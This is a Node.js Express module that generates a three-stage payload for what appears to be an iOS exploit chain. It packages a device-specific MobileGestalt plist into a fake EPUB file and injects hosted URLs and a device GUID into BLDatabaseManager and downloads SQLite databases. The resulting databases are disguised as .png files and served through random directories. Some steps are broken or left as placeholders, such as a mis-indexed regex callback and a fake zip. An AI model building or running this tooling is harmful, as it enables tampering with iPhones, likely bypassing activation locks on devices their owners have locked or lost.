const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { execSync } = require('child_process');

// Debug logging function
function logDebug(msg, level = 'INFO') {
    const timestamp = new Date().toISOString().replace('T', ' ').substr(0, 19);
    const line = `[${timestamp}] [${level}] ${msg}`;
    console.log(line);
}

// Function to generate random directory name
function generateRandomName(length = 16) {
    return crypto.randomBytes(length / 2).toString('hex');
}

// Function to read SQL dump from .png file
function readSQLDump(filename) {
    if (!fs.existsSync(filename)) {
        logDebug(`File not found: ${filename}`, "ERROR");
        throw new Error(`Error: File ${filename} not found`);
    }
    return fs.readFileSync(filename, 'utf8');
}

// Function to create SQLite database from SQL dump
async function createSQLiteFromDump(sqlDump, outputFile) {
    try {
        sqlDump = sqlDump.replace(
            /unistr\s*\(\s*['"]([^'"]*)['"]\s*\)/gi,
            function(matches) {
                let str = matches[1];
                str = str.replace(/\\\\([0-9A-Fa-f]{4})/g, function(m) {
                    const hex = m[1];
                    return Buffer.from(hex, 'hex').toString('utf16le');
                });
                return "'" + str.replace(/'/g, "''") + "'";
            }
        );
        
        sqlDump = sqlDump.replace(/unistr\s*\(\s*(['"][^'"]*['"])\s*\)/gi, "$1");
        
        // Create SQLite database using sqlite3 command line
        const tempSqlFile = outputFile.replace('.sqlite', '_temp.sql');
        fs.writeFileSync(tempSqlFile, sqlDump);
        fs.writeFileSync(outputFile, '');
        
        try {
            execSync(`sqlite3 ${outputFile} < ${tempSqlFile}`, { stdio: 'pipe' });
        } catch (sqlError) {
            logDebug(`SQL execution warnings: ${sqlError.message}`, "WARN");
        }
        
        fs.unlinkSync(tempSqlFile);
        return true;
    } catch (e) {
        logDebug(`SQLite creation failed: ${e.message}`, "ERROR");
        throw new Error("Error creating SQLite database");
    }
}

// Main function to handle the request
async function handleRequest(params, req) {
    logDebug("=== STARTING PAYLOAD GENERATION ===");
    
    const { prd, guid, sn } = params;
    
    if (!prd || !guid || !sn) {
        logDebug(`Missing params: prd='${prd}', guid='${guid}', sn='${sn}'`, "ERROR");
        throw {
            status: 400,
            message: 'Missing prd, guid, or sn'
        };
    }
    
    const prdFormatted = prd.replace(/,/g, '-');
    const basePath = process.cwd();
    
    let plistPath = path.join(basePath, "Maker", prdFormatted, "com.apple.MobileGestalt.plist");
    logDebug(`Trying plist: ${plistPath}`);
    
    if (!fs.existsSync(plistPath)) {
        const altPath1 = path.join(basePath, "Maker", prdFormatted, "com.apple.MobileGestalt.plist");
        const altPath2 = path.join(process.env.DOCUMENT_ROOT || "", "bee33", "Maker", prdFormatted, "com.apple.MobileGestalt.plist");
        
        if (fs.existsSync(altPath1)) {
            plistPath = altPath1;
        } else if (fs.existsSync(altPath2)) {
            plistPath = altPath2;
        } else {
            logDebug(`Plist not found. Tried: ${plistPath}, ${altPath1}, ${altPath2}`, "ERROR");
            throw {
                status: 500,
                message: 'Plist not found'
            };
        }
    }
    
    const realPlistPath = fs.realpathSync(plistPath);
    const plistSize = fs.statSync(realPlistPath).size;
    logDebug(`✅ Using plist: ${realPlistPath} (size: ${plistSize} bytes)`);
    
    // Step 1: Create fixedfile (EPUB-compliant)
    const randomName1 = generateRandomName();
    const firstStepDir = path.join(basePath, "firststp", randomName1);
    fs.mkdirSync(firstStepDir, { recursive: true, mode: 0o755 });
    
    const cachesDir = path.join(firstStepDir, "Caches");
    fs.mkdirSync(cachesDir, { recursive: true, mode: 0o755 });
    
    const tmpMimetype = path.join(cachesDir, "mimetype");
    fs.writeFileSync(tmpMimetype, "application/epub+zip");
    
    const zipPath = path.join(firstStepDir, "temp.zip");
    const fixedFilePath = path.join(firstStepDir, "fixedfile");
    
    // Create zip structure (placeholder - use proper zip library)
    const zipContent = `ZIP with mimetype and plist
mimetype: application/epub+zip
plist: ${realPlistPath}`;
    
    fs.writeFileSync(zipPath, zipContent);
    
    // Clean up temp files
    fs.unlinkSync(tmpMimetype);
    fs.rmdirSync(cachesDir);
    
    // Rename to fixedfile
    fs.renameSync(zipPath, fixedFilePath);
    logDebug(`✅ fixedfile (EPUB-compliant) created: ${fixedFilePath}`);
    
    // URLs
    const protocol = req && req.protocol ? req.protocol : 'http';
    const host = req && req.get ? req.get('host') : process.env.HOST || 'localhost:3000';
    const baseUrl = `${protocol}://${host}`;
    const fixedFileUrl = `${baseUrl}/firststp/${randomName1}/fixedfile`;
    
    // Step 2: BLDatabaseManager.sqlite → belliloveu.png
    const blDump = readSQLDump(path.join(basePath, "BLDatabaseManager.png"));
    const updatedBlDump = blDump.replace(/KEYOOOOOO/g, fixedFileUrl);
    
    const randomName2 = generateRandomName();
    const secondStepDir = path.join(basePath, "2ndd", randomName2);
    fs.mkdirSync(secondStepDir, { recursive: true, mode: 0o755 });
    
    const blSqlite = path.join(secondStepDir, "BLDatabaseManager.sqlite");
    await createSQLiteFromDump(updatedBlDump, blSqlite);
    
    const blFinalPath = path.join(secondStepDir, "belliloveu.png");
    fs.renameSync(blSqlite, blFinalPath);
    const blUrl = `${baseUrl}/2ndd/${randomName2}/belliloveu.png`;
    
    // Step 3: downloads.28.sqlitedb → apllefuckedhhh.png
    const dlDump = readSQLDump(path.join(basePath, "downloads.28.png"));
    let updatedDlDump = dlDump.replace(/https:\/\/google\.com/g, blUrl);
    updatedDlDump = updatedDlDump.replace(/GOODKEY/g, guid);
    
    const randomName3 = generateRandomName();
    const lastStepDir = path.join(basePath, "last", randomName3);
    fs.mkdirSync(lastStepDir, { recursive: true, mode: 0o755 });
    
    const finalDb = path.join(lastStepDir, "downloads.sqlitedb");
    await createSQLiteFromDump(updatedDlDump, finalDb);
    
    const finalPath = path.join(lastStepDir, "apllefuckedhhh.png");
    fs.renameSync(finalDb, finalPath);
    const finalUrl = `${baseUrl}/last/${randomName3}/apllefuckedhhh.png`;
    
    logDebug("✅ All stages generated.");
    
    return {
        success: true,
        parameters: { prd, guid, sn },
        links: {
            step1_fixedfile: fixedFileUrl,
            step2_bldatabase: blUrl,
            step3_final: finalUrl
        },
        debug: {
            plist_used: realPlistPath,
            plist_size: plistSize
        }
    };
}

// Express middleware version
function get2Middleware() {
    return async (req, res, next) => {
        try {
            const result = await handleRequest(req.query, req);
            res.json(result);
        } catch (error) {
            if (error.status) {
                res.status(error.status).json({
                    success: false,
                    error: error.message
                });
            } else {
                res.status(500).json({
                    success: false,
                    error: error.message || 'Internal server error'
                });
            }
        }
    };
}

module.exports = { handleRequest, get2Middleware, logDebug, generateRandomName, readSQLDump, createSQLiteFromDump };

// If run directly
if (require.main === module) {
    const params = {
        prd: process.argv[2] || '',
        guid: process.argv[3] || '',
        sn: process.argv[4] || ''
    };
    
    handleRequest(params, {})
        .then(result => console.log(JSON.stringify(result, null, 2)))
        .catch(error => console.error(error.message || error));
}
